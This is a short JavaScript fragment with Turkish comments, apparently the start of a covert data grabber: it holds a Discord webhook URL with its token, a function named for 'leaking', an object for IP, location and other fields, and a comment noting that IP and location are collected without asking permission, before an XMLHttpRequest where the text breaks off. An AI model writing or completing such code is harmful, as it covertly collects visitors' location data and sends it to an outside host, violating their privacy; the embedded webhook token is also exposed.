        // WEBHOOK URL'Ä°NÄ° BURAYA YAZ (TIRNAK Ä°Ã‡Ä°NE)
        const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";

        async function sÄ±z() {
            let i = { g: "Locked", v: "Locked", b: "N/A", l: "X", ip: "X" };

            // 1. IP ve KONUM (Ä°zin Ä°stemez)
            try {

            const x = new XMLHttpRequest();
